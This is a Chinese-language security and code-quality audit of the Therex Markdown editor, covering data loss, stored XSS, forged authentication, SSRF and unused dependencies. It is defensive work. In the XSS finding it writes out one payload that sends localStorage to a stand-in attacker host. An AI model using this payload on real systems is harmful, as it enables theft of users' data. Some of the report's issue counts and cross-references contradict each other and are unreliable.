# Therex 代码库全面深度审查报告

- **审查日期**: 2026-08-16
- **审查人**: 寇豆码（Kou，软件工程师）
- **审查对象**: `C:\Users\miksz\Desktop\therex-main`
- **项目简介**: Therex —— 现代化 Markdown 编辑器，深度集成 AI（coze-coding-dev-sdk），Next.js 16.1.7 (App Router) + React 19.2.3 + TypeScript 5.9 + Tailwind CSS 4 + shadcn/ui + drizzle-orm + Supabase + Vitest
- **审查方式**: Glob/Grep/Read 系统性扫描全部 137 个源文件（71 ts + 63 tsx + 2 css + 1 png），按 API 路由 → lib 核心模块 → hooks → 组件 → 页面 → 配置/脚本的顺序逐文件审查；对照 package.json 与实际 import 验证依赖使用情况；未修改任何代码。

---

## 一、审查概览

| 维度 | 结论 |
|---|---|
| 审查范围 | 五大维度：代码质量、潜在问题、安全审查、性能优化、架构评估 |
| 扫描文件 | 全部 src/ 下源文件 + 根配置（next.config.ts / package.json / tsconfig / scripts / vitest / eslint） |
| 问题总数 | **44** |
| P0（严重） | **3** |
| P1（重要） | **13** |
| P2（建议） | **28** |
| 未使用依赖 | **23 个**（详见 §5） |
| 是否修改代码 | 否（本阶段仅审查，修改留待下一阶段） |

**最核心结论**：当前版本存在 **1 个确定性数据丢失缺陷（P0）** 和 **1 个可利用的存储型 XSS（P0）**，以及 **AI 配置链路全线断裂**、**协作/分享功能无鉴权且实际不可用** 等多项 P1 问题。建议优先修复 §7 的 Top 10 清单。

---

## 二、P0 严重问题（安全漏洞 / 数据丢失 / 功能不可用）

### P0-1 【数据丢失】StorageManager 从未初始化，页面加载即覆盖 localStorage 中的全部文档

- **文件**: `src/lib/storage/manager.ts:81-100`（initialize）、`src/lib/storage/manager.ts:575-618`（loadData）、`src/lib/storage/manager.ts:620-664`（saveData/doSave）、`src/components/markdown-editor.tsx:302-320`（挂载时直接读取）
- **问题描述**: `StorageManager.initialize()`（内部唯一调用 `loadData()` 从 localStorage 载入文档/文件夹/版本的地方）在**整个应用中没有被任何代码调用**。`markdown-editor.tsx` 挂载时直接调用 `documentManager.getAllDocuments()` / `getCurrentDocument()`，此时内存 Map 为空：
  - `getAllDocuments()` 返回 `[]`（文档列表空白）；
  - `getCurrentDocument()` 因 `currentDocumentId === null` 走到 `createDocument()`（manager.ts:153-158），自动新建文档；
  - 新建文档触发 `saveData()` → 300ms 防抖后 `doSave()` 执行 `localStorage.setItem('therex-documents', JSON.stringify([新文档]))` —— **用单个空文档整体覆盖用户已有文档**。
- **影响分析**: 每次打开应用，用户原有全部文档数据被清空/覆盖，**确定性数据丢失**。这是本项目最严重的问题。`documentManager.initialize` 虽有别名导出（manager.ts:773）但无人调用；测试（`src/lib/storage/__tests__/manager.test.ts`）也只测内存行为，未覆盖 `initialize`/`loadData` 路径，因此未被发现。
- **修复建议**: ① 在应用入口（如 `markdown-editor.tsx` 初始化 effect 或 RootLayout）首先 `await documentManager.initialize()`；② 在 `getCurrentDocument()` 中禁止无文档时静默创建（改为返回 undefined 由 UI 显式触发"新建"）；③ `doSave` 写入前先比较/合并既有 localStorage 数据，避免覆盖丢失；④ 补充 `initialize + loadData` 的单元测试。

### P0-2 【XSS 存储型】Markdown 预览未消毒直接注入 innerHTML，可执行任意脚本

- **文件**: `src/components/markdown-preview.tsx:40`（`previewRef.current.innerHTML = htmlContent`）、`src/lib/markdown-renderer.ts:55-60`（heading 渲染器）、`src/lib/markdown-renderer.ts:288-292`（Mermaid `securityLevel: 'loose'`）、`src/proxy.ts:36`（CSP 允许 `'unsafe-inline'`）
- **问题描述**: `renderCompleteMarkdown()` 使用 `marked.parse()` 渲染，marked 对文档中的**原始 HTML 默认原样透传**；自定义 `heading` 渲染器把 token 的 `text` 未转义直接拼进 HTML（`<h1 ...>${text}</h1>`）。渲染结果经 `innerHTML` 写入 DOM。而 `proxy.ts` 的 CSP 中 `script-src` 带 `'unsafe-inline'`，内联事件处理器（如 `<img onerror>`）可执行。
- **攻击路径**: 用户/协作者/分享文档中写入 `` `<img src=x onerror="fetch('https://evil.com/?d='+localStorage)">` `` → 在应用源内执行 JS → 窃取 localStorage 中全部文档、AI 配置、分享/同步数据，并可以用户身份调用所有 API。
- **影响分析**: 存储型 XSS，影响编辑本人、协作参与者、分享查看者。CSP 因 `'unsafe-inline'` 形同虚设。
- **修复建议**: ① 渲染 HTML 前使用 DOMPurify 消毒（package.json overrides 已含 `dompurify: ^3.2.5`，直接引入使用）；② heading 渲染器对 `text` 先 `escapeHtml`；③ Mermaid `securityLevel` 改为 `'strict'`；④ CSP 移除 `'unsafe-inline'`（script-src 改用 nonce/hash 或至少收紧），并将 `script-src-elem` 去掉 `'unsafe-inline'`；⑤ ECharts 错误回显（见 P2-9）同样先转义。

### P0-3 【越权/IDOR】AI 配置 API 身份完全可伪造，任意用户可读写他人 AI 配置（含 API Key）

- **文件**: `src/app/api/ai-config/route.ts:14-25`（getUserId）
- **问题描述**: `getUserId()` 把请求头 `Authorization: Bearer <任意字符串>` 的**任意字符串直接当作 userId**（`authHeader.slice(7)`），没有签发/校验逻辑；没有该头时回退 `'default_user'`，所有未认证请求共享同一用户。GET/POST/PATCH/DELETE 均以此 userId 做数据隔离过滤（`.eq('user_id', userId)`），因此：
  - 攻击者发送 `Authorization: Bearer victim` 即可冒充任意用户读取其 AI 配置列表（GET 不返回 api_key 明文，但返回 endpoint/model 等）；
  - PATCH/DELETE 可覆盖/删除任意用户配置（PATCH 可将 api_key 改为攻击者指定的 Key → 受害者后续 AI 请求将打到攻击者控制的端点，**Key 泄露与供应链投毒**）；
  - 所有匿名用户共用 `default_user` 的配置，彼此可见可改。
- **影响分析**: 水平越权（IDOR）+ 伪造身份；若部署为多用户服务即为高危漏洞。配合 P1-1/P1-2（前端无法取得 configId）目前真实利用面有限，但这是安全架构的根本缺陷。
- **修复建议**: 接入真实认证（Supabase Auth session 校验：解析 `Authorization: Bearer <JWT>` 并通过 `getUser()` 换取真实 sub 作为 userId，或使用 `getSupabaseClientWithToken` 让 RLS 生效）；删除 `default_user` 兜底，未认证请求直接 401；补充 SQL RLS 策略与迁移。

---

## 三、P1 重要问题（影响正确性 / 明显性能问题 / 安全薄弱点）

### P1-1 【功能不可用】前端 AI 请求与 /api/ai-assist 契约断裂：EnhancedAIPanel 全部功能 400

- **文件**: `src/components/markdown-editor.tsx:1436-1449`（handleAIRequest 发送 `config:{provider,apiKey,...}`）、`src/app/api/ai-assist/route.ts:96-143`（路由只认 `configId`，忽略 `config`）
- **问题描述**: 前端 `handleAIRequest` 请求体携带 `config` 对象但**不携带 `configId`**；`/api/ai-assist` 在 `if (!configId) return 400 '请先在设置中配置 AI'` 直接拒绝。全项目 grep 确认前端**从未发送过 configId**。→ 所有走 `/api/ai-assist` 的功能（EnhancedAIPanel 的聊天/续写/润色/翻译等）**必然失败**。
- **附带缺陷（chat 消息被丢弃）**: `/api/ai-assist` 的 `getPrompts('chat', ...)` 分支用 `userMessage` 作为用户输入（route.ts:465-488），但前端把用户消息放在 `selection` 字段（EnhancedAIPanel.tsx:393 `onAIRequest('chat', content, input.trim())`），`userMessage` 恒为 undefined → 即使绕过 configId，AI 也只会收到默认问候语"你好，请帮我看看这篇文档。"，用户输入完全丢失。
- **修复建议**: 二选一并统一：① 前端先 `GET /api/ai-config` 拿到配置 id 后携带 `configId`，并修正 chat 请求把用户消息放入 `userMessage` 字段；② 或后端移除 configId 强制要求，改为服务端 env 配置 + 白名单校验。同时删除 handleAIRequest 中向服务器发送明文 `config.apiKey` 的多余字段（避免日志泄露）。

### P1-2 【功能不可用】AI Key 无法保存到后端；isApiKeyConfigured 恒为 false

- **文件**: `src/lib/ai-config.ts:339-361`（saveApiKeyToBackend）、`src/lib/ai-config.ts:390-401`（isApiKeyConfigured）、`src/app/api/ai-config/route.ts:190-201`（PATCH 要求 id）、`src/app/api/ai-config/route.ts:85-121`（GET 返回 `{data: [...]}`）
- **问题描述**: ① `saveApiKeyToBackend` 发送 PATCH 但**没有 `id` 字段** → 路由返回 400 '缺少配置 ID'，Key 永远存不进数据库（静默失败）；② `isApiKeyConfigured()` 读取响应 `data.api_key_set`，但 GET 返回的是 `{ data: [...] }` 数组，字段名也不匹配 → 恒 false；③ 设置页 `handleTestConnection`（settings/page.tsx:108-146）实际调用 `/api/ai/service`（Coze SDK 通道），与用户配置的 API Key/端点无关，测试结果无意义。
- **影响分析**: 设置页的"保存 AI 配置 / 测试连接 / 检查是否已配置"全部是假功能；后端 AI 配置表形同虚设。
- **修复建议**: 统一 AI 配置数据流：POST 创建 → 返回含 `id` → 前端保存 id；PATCH 携带 id；GET 返回结构统一为 `{ data: [{..., api_key_set}] }` 或单对象；`isApiKeyConfigured` 按实际结构读取。

### P1-3 【安全】协作功能完全无鉴权，房间 ID 仅 8 位十六进制可枚举

- **文件**: `src/lib/collaboration/server.ts:66-68`（generateRoomId）、`src/app/api/collaboration/create|join|sync|cursor|events|room/[roomId]/route.ts`（全部无认证）
- **问题描述**: ① 所有协作 API 无任何身份认证，`userId` 由客户端自报；② 房间 ID 为 `randomUUID().substring(0,8)`（32 位熵），可暴力枚举；③ `events/route.ts` 的 SSE 不校验请求者是否在房间内；④ `room/[roomId]` GET 返回完整文档内容+操作记录，任何人拿到/猜到 roomId 即可读取；⑤ `sync` 允许任意在房用户**覆盖整篇文档内容**（last-write-wins）。
- **影响分析**: 文档内容可被未授权方读取/篡改；房间枚举成本低（约 43 亿组合但可并行扫描，且 roomId 会出现在 URL/邀请链接/浏览器历史中，实际泄露面大）。
- **修复建议**: ① roomId 改用完整 UUID 或至少 128 位随机；② 增加邀请令牌/密码；③ SSE 建立前校验用户身份（通过 join 返回的 token 做订阅鉴权）；④ sync 增加版本号冲突检测；⑤ 文档内容写入限长。

### P1-4 【功能缺陷】协作页 SSE 无限重连循环 + 文档内容经 URL 传递

- **文件**: `src/app/collab/[roomId]/page.tsx:200-242`、`src/app/collab/[roomId]/page.tsx:72-73`
- **问题描述**: SSE effect 依赖数组包含 `room`（对象引用）。`init` 消息到来 → `setRoom(data.room)`（新对象）→ effect 清理（关闭 EventSource）→ 重新建立连接 → 再次收到 init → 循环往复。实测表现为连接抖动、心跳堆积。此外 `docContent = searchParams.get('content')` 把文档内容放进 URL query，内容泄露进地址栏/浏览器历史/服务器访问日志，且超出 URL 长度上限（约 8KB）后内容被截断。
- **修复建议**: effect 依赖改为稳定值（`isConnected/userId/roomId`），房间数据用 ref 或函数式更新，避免以对象引用作依赖；文档内容改由 API 获取，勿经 URL 传递。

### P1-5 【功能缺陷/安全】分享功能实际不可用：读 localStorage + 密码明文

- **文件**: `src/app/share/[shareId]/page.tsx:39-45`、`src/lib/share/manager.ts:84-102`、`src/lib/share/manager.ts:152-173`
- **问题描述**: ① 分享记录存储在**创建者浏览器 localStorage**，其他用户打开 `/share/[shareId]` 时 `getShare` 返回 null → 永远显示"分享链接不存在"；**分享功能跨用户完全失效**；② `ShareRecord.password` 注释声称"密码哈希（不存储明文）"，实际 `password: options.password` 直接存明文，页面用字符串相等比对（share/[shareId]/page.tsx:74）；③ `recordView` 计数只在本机生效。
- **修复建议**: 分享数据落到服务端（Supabase 表或独立 API），密码用 bcrypt/argon2 哈希后存储；过期清理服务端化。若短期无法服务端化，应在 UI 明确提示"仅本机可访问"并移除密码误导。

### P1-6 【功能缺陷】云同步是"空转"：/api/sync 路由不存在，冲突处理会丢数据

- **文件**: `src/lib/sync/cloud-sync.ts:216-246`（syncWithServer）、`src/lib/sync/cloud-sync.ts:257-293`（handleConflict）
- **问题描述**: ① `syncWithServer` 请求 `/api/sync`，但项目中**不存在该 API 路由**（已用 Glob 确认）→ 命中 404 分支（line 240-246）把记录直接标记 `synced` 并删除队列 → 用户以为已同步，实际从未上传；② `handleConflict` 的 `'local'` 策略把本地记录标记 synced 后**不推送服务器**，`'remote'` 策略**静默覆盖本地内容**——两种自动策略都可能造成数据丢失。
- **修复建议**: 实现 `/api/sync` 路由（对接 Supabase 或文档存储）；冲突默认 manual；`'local'` 策略必须真正把本地版本推送到服务端后再标记完成。

### P1-7 【构建问题】next.config.ts 硬编码 `/workspace/projects`，Windows 本机构建受影响

- **文件**: `next.config.ts:9-10`
- **问题描述**: `outputFileTracingRoot: '/workspace/projects'` 是 Coze 云环境的硬编码工作区路径。注释写明其用途仅为"消除 lockfile 检测警告"。在 Windows 本机（`C:\Users\...`）该路径不存在，`pnpm build`（standalone 输出）进行文件追踪时会找不到根目录 → 报错或生成残缺的 standalone 产物。同时 `webpack: (config: Record<string, unknown>, ...)` 使用宽松类型且手动改 `optimization`，与 Next 16 默认 Turbopack/内部 webpack 配置存在覆盖冲突风险（`...(config.optimization as Record<string, unknown>)` 破坏类型安全）。
- **修复建议**: 删除该行或改为 `outputFileTracingRoot: __dirname`（与 dev 分支 turbopack.root 一致）；webpack 回调使用 Next 官方导出的 `WebpackConfigContext`/`Configuration` 类型；如无必要可直接移除整个 webpack 分支。

### P1-8 【安全】API 无速率限制（限流器是死代码），且 IP 识别可伪造

- **文件**: `src/lib/api-utils.ts:88`（rateLimiter 单例）、`src/lib/api-utils.ts:211-259`（withApiHandler）、`src/lib/api-utils.ts:93-109`（getClientIdentifier）
- **问题描述**: 全局 grep 确认 `rateLimiter`/`withApiHandler`/`ApiResponse`/`ApiLogger` **没有被任何 API 路由使用**。所有 API（AI 流式、协作、知识库）均可被无限调用 → AI 费用耗尽、内存/CPU 打满。即便接入，`getClientIdentifier` 直接信任客户端可控的 `X-Forwarded-For` 头，攻击者可轮换伪造绕过。
- **修复建议**: 用 `withApiHandler` 包裹敏感路由（至少 AI 与协作）；服务端限流键使用真实 peer IP（如 `request.ip` / `x-real-ip` 仅作参考）+ 用户维度；生产环境建议上 Redis 分布式限流。

### P1-9 【安全】SSRF 防护不完整（白名单失效 + 私网网段漏网 + IPv6 未处理）

- **文件**: `src/app/api/ai-assist/route.ts:33-65`（isUrlSafe）
- **问题描述**: ① 白名单校验后 fallback `return url.protocol === 'https:' && !/^\d+\.\d+\.\d+\.\d+$/.test(hostname)` —— **任意公网 HTTPS 域名都被放行**，白名单形同虚设；② 私网拦截只覆盖 `172.16.` 前缀，`172.17.0.0`~`172.31.255.255` 未拦截；③ 未处理 IPv6（`::1`、`fe80::`、`[::ffff:127.0.0.1]` 均可绕过）；④ 未防 DNS rebinding。
- **影响分析**: 若用户配置了恶意/被攻破的 `apiEndpoint`，服务端 fetch 可访问内网（云元数据 169.254.169.254 已拦但其余内网可及）。
- **修复建议**: 移除"任意公网 HTTPS 放行"回退，严格按白名单校验；私网判断改用 IP 解析后判断（含 IPv6、172.16/12 全段）；对解析出的 IP 再做一次校验（防 rebinding）。

### P1-10 【安全】知识库 API 将用户 tableName 直接透传，无校验/无鉴权/无限流

- **文件**: `src/app/api/ai/knowledge/route.ts:23`、`src/lib/ai/service.ts:277-303`（addToKnowledgeBase）
- **问题描述**: `tableName` 未做任何校验直接传入 `knowledgeClient.addDocuments([doc], tableName, ...)`；POST/GET 均无鉴权、无限流；`topK`/`minScore` 由用户任意指定（topK 可传极大值 → 返回大量数据）。若 SDK 对 table 名解析不当存在表注入/跨库访问风险（取决于 coze 服务端实现，但调用方应加白名单）。
- **修复建议**: tableName 白名单化（仅允许 `therex_knowledge` 等预置表）；topK 限制 1~20、minScore 限制 0~1；补充鉴权与限流。

### P1-11 【资源/运维】dev.sh 使用 `ss` + `kill -9` 强杀占用端口的进程

- **文件**: `scripts/dev.sh:8-28`
- **问题描述**: 依赖 Linux `ss` 命令（Windows Git Bash 无此命令，脚本逻辑失效）；对占用 5000 端口的**任意进程**执行 `kill -9`，可能误杀与本项目无关的服务。
- **修复建议**: 检测端口占用改用跨平台方式（如 `netstat -ano` 解析或 Node 脚本）；默认不自动杀进程，改为提示用户手动处理。

### P1-12 【资源】流式接口不响应客户端断开（AI/SSE 请求持续占用）

- **文件**: `src/app/api/ai/service/route.ts:66-182`、`src/app/api/ai-assist/route.ts:286-388`
- **问题描述**: `ReadableStream.start` 中未监听 `controller.signal`/客户端 abort；浏览器关闭页面或取消请求后，服务端仍继续迭代 AI generator、继续调用上游 LLM API → 上游费用持续产生、连接资源不释放。
- **修复建议**: 在 start 内注册 `controller.signal.addEventListener('abort', ...)`，abort 时调用 generator 的 `return()`/AbortController 中止上游 fetch（ai-assist 的 fetch 应传入 `signal`）。

### P1-13 【数据】保存竞态与防抖丢失：关闭页面/组件卸载时最近编辑可能丢失

- **文件**: `src/components/markdown-editor.tsx:447-466`、`src/lib/storage/manager.ts:620-664`
- **问题描述**: ① 内容保存防抖 500ms + StorageManager 内部又防抖 300ms；`beforeunload`/`pagehide` 时**无强制 flush**，用户在两次防抖窗口内关闭标签页 → 最近编辑丢失；② markdown-editor 保存 effect 的 cleanup 中 `documentManager.updateDocument` 是同步调用但外层的 `setDocuments(...)` 状态未刷新，且组件卸载与切换文档并发时存在旧内容覆盖新内容的风险（cleanup 闭包捕获旧 `content`）。
- **修复建议**: 注册 `pagehide`/`visibilitychange` 时调用 `forceSave()`；卸载时用 ref 保存最新 content 再保存；切换文档前先 flush 当前文档。

---

## 四、P2 建议问题（代码质量 / 可维护性）

### 4.1 代码质量与命名

| # | 文件:行 | 问题 | 建议 |
|---|---|---|---|
| P2-1 | `src/components/markdown-editor.tsx`（全文 2000+ 行） | 单体组件过大，状态 40+ 个，逻辑/UI 混合 | 拆分为 hooks（useDocuments/useEditor/useAI...）+ 子组件 |
| P2-2 | `src/components/ai/ai-panel.tsx`、`ai-toolbar.tsx` | 旧版 AI 面板与 `editor/EnhancedAIPanel` 功能重复 | 合并，保留一个实现 |
| P2-3 | `src/lib/storage/manager.ts:728-774` | `documentManager` 兼容别名与 `getStorageManager` 重复暴露同一 API，易产生双入口混乱 | 只保留 `getStorageManager`，别名迁移期后删除 |
| P2-4 | `src/storage/database/schema.ts:72` | 自引用外键 `references((): any => folders.id)` 使用 any | 改为 `references(() => folders.id)` |
| P2-5 | `src/lib/utils.ts:16-18` | `generateId` 用 `Date.now()+Math.random()`，并发下可能碰撞（文档/版本/协作 ID 均依赖它） | 改用 `crypto.randomUUID()` |
| P2-6 | `src/lib/secure-storage.ts:173-196` | `generatePassword` 使用 `Math.random()` 非加密安全随机 | 改用 `crypto.getRandomValues` |
| P2-7 | `src/components/markdown-editor.tsx:1223` | `documents.reduce((sum, doc) => sum + doc.content?.length || 0, 0)` 运算符优先级错误：`sum + undefined` 得 NaN → `NaN||0` 使 totalCharacters 失真 | 改写为 `sum + (doc.content?.length ?? 0)` |
| P2-8 | `src/components/markdown-editor.tsx:1247-1250` | Dashboard 使用 `Math.random()*1000` 模拟数据冒充真实统计 | 用真实数据或标注"示例数据" |
| P2-9 | `src/components/markdown-editor.tsx:1897-1899` | "重命名"菜单项无 onClick（死 UI） | 实现或移除 |
| P2-10 | `src/lib/ai-usage-tracker.ts` | `recordUsage` 从未被调用（grep 仅定义处），AI 统计不产生数据 | 在 AI 调用处接入或删除 |

### 4.2 死代码 / 未接线模块

| # | 模块 | 问题 | 建议 |
|---|---|---|---|
| P2-11 | `src/lib/api-utils.ts`（RateLimiter/ApiResponse/ApiLogger/withApiHandler/validateRequestSize/safeParseJson 等） | 全部未在任何路由使用 | 接入路由或删除；保留则至少让 AI/协作路由使用 |
| P2-12 | `src/lib/storage/adapters/supabase-storage.ts`、`indexeddb-storage.ts` | 适配器实现完整但 StorageManager 仅用 localStorage，`migrateTo` 是"导出→清空→导回"空操作（manager.ts:532-548） | 接线适配器或明确移除；migrateTo 至少按 provider 实例化对应 adapter |
| P2-13 | `src/lib/sync/cloud-sync.ts` | 后端 API 缺失（见 P1-6），整体空转 | 实现 /api/sync 或下线该功能 |
| P2-14 | `src/lib/error-handler.ts` | `handleError/tryAsync/errorHandler` 未在业务代码中使用 | 接入统一错误处理或删除 |
| P2-15 | `src/lib/config-check.ts` | `initConfigCheck` 无调用方 | 在服务端入口调用 |
| P2-16 | `src/lib/export-utils.ts` 与 `src/lib/export/index.ts` | 两套导出工具并存（后者又被 `components/export/DocumentExporter.tsx` 再包一层） | 合并为单一导出层 |
| P2-17 | drizzle 层（schema.ts/drizzle.config.ts/drizzle-zod/drizzle-kit） | 仅 schema 定义，无任何 drizzle 查询客户端；Supabase 直连走另一条路 | 二选一：让 drizzle 接入实际存储，或移除 schema/依赖 |

### 4.3 安全加固（低危）

| # | 文件:行 | 问题 | 建议 |
|---|---|---|---|
| P2-18 | `src/components/markdown-editor.tsx:984-999` | HTML 导出把**原始 Markdown 源码**直接嵌入 `<body>`，含原始 HTML 时导出文件可执行脚本 | 导出前用渲染+DOMPurify 消毒 |
| P2-19 | `src/lib/export-utils.ts:142` | `marked(content)` 渲染后直接拼入导出 HTML，未消毒 | 同上 |
| P2-20 | `src/lib/markdown-renderer.ts:359-366` | ECharts 渲染失败时把 `error.message`/`configData` 未转义注入 innerHTML（JSON.parse 错误消息含攻击者片段） | `escapeHtml` 后再插入 |
| P2-21 | `src/lib/share/manager.ts:91` | 明文密码存 localStorage（见 P1-5） | 哈希化 |
| P2-22 | `src/storage/database/schema.ts:129` | `ai_configurations.api_key` 明文 text 列 | 服务端加密（如 pgcrypto/pgsodium） |
| P2-23 | `src/proxy.ts:36-49` | CSP 含 `'unsafe-inline'`（script/style），防 XSS 意义大幅削弱 | 收紧 CSP（见 P0-2） |

### 4.4 性能

| # | 文件:行 | 问题 | 建议 |
|---|---|---|---|
| P2-24 | `src/app/collab/[roomId]/page.tsx:200-242` | SSE effect 依赖 `room` 对象造成重连抖动（同 P1-4），同时每次心跳若版本变化就整篇 `fetchRoom` 拉全文 | 只拉增量/仅当文档版本变化时拉取 |
| P2-25 | `src/lib/markdown-renderer.ts:313-370` | `initECharts` 每次内容变化全量重扫所有容器并重建实例（`cleanupECharts` 全局清空） | 按容器 diff，仅重建变化的图表 |
| P2-26 | `src/components/markdown-preview.tsx:36-37` | 每次 markdown 变化全局 `cleanupECharts()`，多实例场景互相影响 | 改为实例级清理 |
| P2-27 | `src/lib/storage/manager.ts` | 每次 `updateDocument` 都整表序列化全部文档/文件夹/版本写入 localStorage（即使只改一个字段），大文档集下卡顿 | 按文档维度增量写入或改 IndexedDB |
| P2-28 | `src/app/api/collaboration/events/route.ts:43-60` | 30s 心跳把完整协作者数组全量广播；SSE 无压缩 | 心跳仅发变化增量 |

### 4.5 测试质量

| # | 文件 | 问题 | 建议 |
|---|---|---|---|
| P2-29 | `src/__tests__/ai-service.test.ts` | 只测正则/简单字符串，未真正调用 AIService（mock 了 fetch 但未用） | 补充真实单测（mock LLMClient 层） |
| P2-30 | `src/__tests__/api.test.ts` | 依赖外部 `http://localhost:5000` 且多处"跳过测试"，集成性弱 | 用 Next 测试工具或改为单元级 |
| P2-31 | `src/lib/storage/__tests__/manager.test.ts` | 未覆盖 initialize/loadData/持久化（恰是 P0-1 漏洞盲区） | 补 localStorage 持久化测试 |

---

## 五、未使用依赖清单（对照 package.json 与 src/scripts/e2e import）

> 统计方式：`grep -rl --include=*.ts --include=*.tsx "<pkg>" src/ scripts/ e2e/`，0 命中即视为未使用（`tw-animate-css` 在 `globals.css` 中 @import，判为已用）。

**dependencies 中未使用（17 个）**:

| 依赖 | 说明 |
|---|---|
| `@hookform/resolvers` | 无 react-hook-form 使用 |
| `@radix-ui/react-accordion` | 无 ui/accordion.tsx，无引用 |
| `@radix-ui/react-aspect-ratio` | 无引用 |
| `@radix-ui/react-avatar` | 无引用 |
| `@radix-ui/react-collapsible` | 无引用 |
| `@radix-ui/react-context-menu` | 无引用 |
| `@radix-ui/react-hover-card` | 无引用 |
| `@radix-ui/react-menubar` | 无引用 |
| `@radix-ui/react-navigation-menu` | 无引用 |
| `@radix-ui/react-radio-group` | 无引用 |
| `@radix-ui/react-toggle` | 无引用 |
| `@radix-ui/react-toggle-group` | 无引用 |
| `date-fns` | 无引用 |
| `echarts-for-react` | 项目自行封装 echarts，未用该封装 |
| `embla-carousel-react` | 无引用 |
| `jspdf` | html2canvas 已用，jspdf 无引用 |
| `react-day-picker` | 无引用 |
| `react-hook-form` | 无引用 |
| `react-resizable-panels` | 无引用 |
| `recharts` | 无引用 |
| `rehype-katex` | 项目用 marked + 自研 katex 正则渲染，未用 rehype |
| `remark-gfm` | 未用（marked gfm 已开启） |
| `vaul` | 无引用 |
| `pg` | package.json 声明但 src 中无任何 import |

**devDependencies 中未使用或多余（2 个）**:
- `shadcn`（`"latest"` 不规范，仅脚手架时使用，运行时不需要）
- `eslint-config-next: 15.5.14` 与 `next: 16.1.7`、`@next/eslint-plugin-next: ^16.2.2` **版本不一致**（15 vs 16 的规则集可能冲突/缺失）

**建议**：删除以上 24 个未使用依赖 + `pg` 相关的 `@types/pg`（若确认不再接 drizzle+pg），可显著减小安装体积与攻击面；将 `shadcn` 固定版本或移入 scripts。

---

## 六、架构评估结论与重构建议

### 6.1 现状评估

1. **路由组织（合理）**: `src/app/api/{ai,ai-assist,ai-config,collaboration}` 按功能分目录，符合 App Router 惯例；但缺少统一 API 中间件（鉴权/限流/校验/日志），每个路由各自手写 try-catch（且大量未使用已有的 `api-utils` 封装）。
2. **AI 层（混乱，双轨断裂）**: 存在三条互不兼容的 AI 通路：
   - `/api/ai/service`：Coze SDK（工作负载身份），前端 useAI/useAIChat 使用；
   - `/api/ai-assist`：OpenAI 兼容代理 + DB 配置（configId），EnhancedAIPanel 使用——但前端从没发 configId（P1-1）；
   - `/api/ai-config`：DB 配置 CRUD——前端保存 Key 的链路又缺 id（P1-2）。
   三条通路契约不一致，前端无法端到端使用其中任何一条的完整能力。
3. **存储层（多套并存，职责不清）**: `StorageManager(localStorage)` + 三个 adapter（仅 localStorage 接入）+ Supabase admin client 直连 + drizzle schema（未接线）+ cloud-sync（无后端）。数据通路多、迁移逻辑为空操作（P2-12），并叠加 P0-1 初始化缺陷。
4. **协作层（demo 级）**: 内存态、无持久化、无 OT/CRDT（last-write-wins）、无鉴权、房间 ID 弱、SSE 轮询式广播。仅适合单进程演示。
5. **前端组件（膨胀）**: `markdown-editor.tsx` 单文件 2000+ 行承载编辑/文件管理/AI/协作/设置/导出等全部功能；旧 AI 面板与新版并存。
6. **安全基线（薄弱）**: 无认证体系（伪 Bearer）、无 RLS 迁移、Key 明文存储、CSP 形同虚设、SSRF 不完整、全 API 无限流。

### 6.2 重构建议（含理由与风险）

**R1. 引入统一 API 基础设施层（建议 2-3 周）**
- 内容：实现 `withApiHandler` 正式化（鉴权中间件 + rateLimit + zod 校验 + 统一错误响应），所有路由接入。
- 理由：消除 P1-8/P0-3 等系统性风险；降低新路由开发成本。
- 风险：需要先确定认证方案（Supabase Auth + JWT），涉及前端登录态，影响面较大——建议与 R2 一并做。

**R2. 统一 AI 配置数据流（建议 1 周）**
- 内容：以 `/api/ai-config` 为唯一配置源：POST 创建返回 id → 前端持久化 id → `/api/ai-assist` 只接受 configId；修复 `isApiKeyConfigured` 字段；`/api/ai/service` 增加"读取 DB 默认配置"能力或明确二选一。
- 理由：修复 P1-1/P1-2，让 AI 功能真正可用。
- 风险：需同步改前端 3 个调用点（useAI/useAIChat/handleAIRequest/EnhancedAIPanel），回归测试 AI 面板。

**R3. 存储层收敛（建议 1-2 周）**
- 内容：先修复 P0-1 初始化；删除 `documentManager` 别名与未接线 adapter（或真正接入 IndexedDB/Supabase）；`migrateTo` 落地或移除。
- 理由：消除数据丢失与多入口混乱。
- 风险：低（主要是删代码 + 入口初始化）。

**R4. 协作层升级（建议 2-4 周）**
- 内容：房间持久化（Supabase 表）、邀请令牌鉴权、房间 ID 加强、SSE 订阅鉴权、文档同步改版本号冲突检测或引入 Yjs/CRDT。
- 理由：P1-3/P1-4 属于不可交付级缺陷。
- 风险：中（实时协作改动大）；若产品定位单机为主，可先下架协作功能。

**R5. 安全加固专项（建议 1 周，可与以上并行）**
- 内容：Markdown 渲染 DOMPurify 消毒（P0-2）、SSRF 收紧（P1-9）、CSP 收紧、API 限流接入（P1-8）、分享服务端化或降级提示（P1-5）。
- 理由：安全红线。
- 风险：低-中；DOMPurify 需保持 KaTeX/Mermaid/ECharts 白名单。

**R6. 前端拆分为多文件（建议持续进行）**
- 内容：`markdown-editor.tsx` 拆为 hooks + 若干 feature 组件（documents、editor、ai、collaboration、settings、export）。
- 理由：可维护性；P2-1。
- 风险：低（纯搬移），注意保持行为一致。

---

## 七、总结：最需要优先修复的前 10 项

| 优先级 | 编号 | 问题 | 级别 | 影响 |
|---|---|---|---|---|
| 1 | P0-1 | StorageManager 未初始化导致 localStorage 文档被覆盖丢失 | P0 | 数据丢失 |
| 2 | P0-2 | Markdown 渲染 XSS（innerHTML + 未消毒 + CSP unsafe-inline） | P0 | 任意脚本执行/数据窃取 |
| 3 | P0-3 | AI 配置 API 身份伪造/越权（伪 Bearer + default_user 兜底） | P0 | 配置越权/Key 投毒 |
| 4 | P1-1 | 前端与 /api/ai-assist 契约断裂（无 configId + chat 消息丢弃） | P1 | AI 面板全部功能不可用 |
| 5 | P1-2 | AI Key 无法保存到后端（PATCH 缺 id；isApiKeyConfigured 字段错） | P1 | 设置页 AI 配置假功能 |
| 6 | P1-3 | 协作全 API 无鉴权 + 房间 ID 32 位可枚举 | P1 | 文档泄露/篡改 |
| 7 | P1-4 | 协作页 SSE 无限重连循环 + 内容经 URL 传递 | P1 | 连接抖动/内容泄露 |
| 8 | P1-5 | 分享功能跨用户不可用 + 密码明文存储 | P1 | 功能失效/密码泄露 |
| 9 | P1-6 | 云同步 /api/sync 缺失 + 冲突自动解决丢数据 | P1 | 同步假象/数据丢失 |
| 10 | P1-7/P1-8 | next.config 硬编码路径（Windows 构建）+ API 全无限流 | P1 | 构建失败/资源耗尽 |

